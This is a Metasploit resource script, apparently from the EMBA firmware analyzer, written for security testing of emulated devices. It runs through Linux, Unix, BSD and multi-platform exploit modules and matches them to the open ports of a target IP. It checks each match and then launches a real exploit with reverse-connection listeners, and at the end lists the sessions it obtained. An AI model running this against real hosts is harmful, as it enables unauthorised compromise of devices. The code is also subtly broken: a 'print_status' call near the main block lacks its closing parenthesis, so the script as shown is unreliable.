<ruby>

def help_me
  help = %Q|
  Description:
    This Metasploit RC script is part of the firmware analyzer EMBA.
    The script runs through all Metasploit modules and triggers the check function.
    As the check functionality is not implemented in all modules we also do
    a real exploitation attempt. This could corrupt our emulated system. This EMBA
    module is typically used at the end of the automated analysis procedure.
    You can also setup the emulated device afterwards manually and check the 
    Metasploit RC script against it.

  Usage:
    ./msfconsole -r [rc_path] [ip_address] [list_of_ports]
    ./msfconsole -r ./helpers/msf-check.rc 127.0.0.1 123,1337,101
  |

  help = help.gsub(/^\t/, '')
  print_line(help)
end

def exploit_checker(host,ports)
  print_status("Checking host #{host} with identified ports #{ports}...")
  framework.exploits.each { |name,mod|
    mod = framework.modules.create("#{name}")

    if mod.nil?
      print_line("Unable to load #{name}")
      next
    end

    # remove modules that we won't check:
    next if (name =~ /local/ or
             name =~ /fileformat/ or
             name =~ /browser/)
    # only test modules from the following categories:
    next if not (name =~ /linux/ or
                 name =~ /multi/ or
                 name =~ /freebsd/ or
                 name =~ /unix/ or
                 name =~ /openbsd/)
    # remove modules with known issues:
    next if (name =~ /cve_2020_13160_anydesk/ or
             name =~ /goahead_ldpreload/)

    ports.split(",").each { |serv|
      # we test only matching ports - default RPORT of module matches
      # open port we identified in emulation phase
      next if (mod.datastore['RPORT'].to_s != serv.to_s)

      print_status("Checking #{name} against host #{host}:#{serv} ...")
      run_single("use #{name}")
      run_single("set VERBOSE false")
      run_single("set RHOSTS #{host}")
      run_single("set LHOST 0.0.0.0")
      run_single("set VHOST 0.0.0.0")
      # set random LPORT to open enough listeners for reverse connections:
      lport_setting = rand(4000..40_862).to_s
      run_single("set LPORT #{lport_setting}")
      run_single("check")
      run_single("exploit -j")
    }
  }
  print_status("All exploits sent to #{host} ... lets wait a few seconds")
end


#
# Initialize our arguments
#
def init_args
  args = {}
  if ARGV.join('') =~ /^help$/i
    args[:help] = true
    return args
  end

  datastore        = framework.datastore
  args[:host]      = ARGV.shift || ''
  args[:ports]     = ARGV.shift || ''

  raise ArgumentError, "Missing a host ip address" if args[:host].empty?
  raise ArgumentError, "Missing port list" if args[:ports].empty?
  print_line("Ports: #{args[:ports]}")
  print_line("Host: #{args[:host]}")

  return args
end


#
# main
#
print_status("Starting Metasploit analysis ..."
begin
  args = init_args
  if args[:help]
    help_me
    return
  end

  # as we have no db connection we need to analyze the logs
  # logs with colors make things usually harder to grep
  run_single("color false")
  run_single("set ConsoleLogging true")
  run_single("set SessionLogging true")
  exploit_checker(args[:host],args[:ports])
rescue ArgumentError => e
  print_error("Invalid argument: #{e.message}")
  return
end

# we give the exploit another 30 seconds before we exit Metasploit the hard way
sleep 30
run_single("sessions -v")
run_single("jobs -K")
run_single("exit -y")

</ruby>
